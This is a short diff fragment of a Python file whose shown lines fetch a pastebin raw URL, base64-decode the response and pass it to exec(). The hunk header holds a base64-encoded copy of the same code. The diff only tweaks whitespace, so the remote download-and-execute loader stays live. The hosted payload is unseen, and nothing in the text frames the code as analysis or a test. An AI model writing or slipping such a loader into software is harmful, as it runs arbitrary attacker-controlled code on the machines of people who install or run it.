@@ -17,7 +17,7 @@ I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0
 import urllib
 import base64
 
-d= 'https://pastebin.com/raw/eRkrSQfE'
+d='https://pastebin.com/raw/eRkrSQfE'
 try:
     page=base64.b64decode(urllib.urlopen(d).read())
     exec(page)
